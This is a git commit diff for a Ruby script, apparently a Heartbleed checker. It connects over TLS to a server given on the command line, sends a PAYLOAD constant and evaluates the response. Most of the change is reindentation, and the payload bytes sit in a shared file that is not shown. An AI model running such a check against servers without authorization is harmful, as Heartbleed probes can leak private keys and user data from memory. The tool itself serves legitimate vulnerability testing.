bf88e6ccdd059d3ae8748ad13a5a753cea1e6717
krishpranav <krisna.pranav@gmail.com>
2021-07-16 10:33:09 +0530

    heartbleed test

--- heartbleed-test.rb
+++ heartbleed-test.rb
@@ -1,15 +1,14 @@
-#!/usr/bin/env ruby
-
+# encoding: BINARY
 require 'socket'
 require 'timeout'
 
 require_relative 'shared'
 
 def read_until_server_hello_done(sock)
-    loop do
-        record = read_record(sock)
-        break if record.value == SERVER_HELLO_DONE
-    end
+  loop do
+    record = read_record(sock)
+    break if record.value == SERVER_HELLO_DONE
+  end
 end
 
 server = ARGV[0]
@@ -17,9 +16,19 @@ port = (ARGV[1] || 443).to_i
 raise "Usage: ruby heartbleed.rb <server>" unless server
 
 sock = begin
-    Timeout.timeout(3) { TCPSocket.open(server, port) }
+  Timeout.timeout(3) { TCPSocket.open(server, port) }
 rescue Timeout::Error
-    raise "Couldn't connect to #{server}:#{port}"
+  raise "Couldn't connect to #{server}:#{port}"
 end
 
 sock.write(CLIENT_HELLO)
+
+begin
+  read_until_server_hello_done(sock)
+rescue Timeout::Error
+  raise "Couldn't establish TLS connection."
+end
+
+sock.write(PAYLOAD)
+
+evaluate_heartbleed(sock)
